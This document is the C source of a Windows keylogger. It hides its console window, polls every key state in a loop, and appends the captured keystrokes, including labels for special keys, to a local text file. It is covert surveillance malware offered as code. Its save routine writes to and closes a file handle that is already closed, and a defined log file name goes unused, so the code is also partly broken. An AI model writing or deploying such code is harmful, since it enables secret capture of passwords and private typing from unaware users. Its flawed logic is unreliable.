#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <ctype.h>
#include <stdbool.h>
//path for the log file

#define LOG_FILE "keylogger.txt"

//for saving data
void saveData(const char* data){
FILE *file = fopen("output.txt", "a");
if (file != NULL){
    fputs(data, file);
    fclose(file);
//write data into log file
fputs(data, file);
fclose(file);

}
}

const char* translateSpecialKey(int key){
switch (key){
case VK_SPACE:
    return " ";
case VK_RETURN:
    return "\\n";
case VK_BACK:
    return "\\b";
case VK_CAPITAL:
    return "[CAPS_LOCK]";
case VK_SHIFT:
    return "[SHIFT]";
case VK_TAB:
    return "[TAB]";
case VK_CONTROL:
    return "[CTRL]";
case VK_MENU:
    return "[ALT]";
default:
    return "[UNKOWN]"; // this for any non handeled keys
    }
}

int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL,};


int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {  
                bool isSpecialKey = false;
                const char* specialKeyStr = NULL;

                for (int i = 0; i < sizeof(specialKeyArray) / sizeof(int); i++) {
                    if (key == specialKeyArray[i]) {
                        isSpecialKey = true;
                        specialKeyStr = translateSpecialKey(key);
                        break;
                    }
                }
                if (isSpecialKey && specialKeyStr != NULL) {
                    saveData(specialKeyStr);
                } else if (!isSpecialKey) {
                    char ascii = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
                    if (isprint(ascii)) {
                        char printable[2] = {ascii, '\0'}; 
                        saveData(printable);
                    }
                }
            }
        }
        Sleep(50); // Reduce CPU usage
    }

    return 0;
}
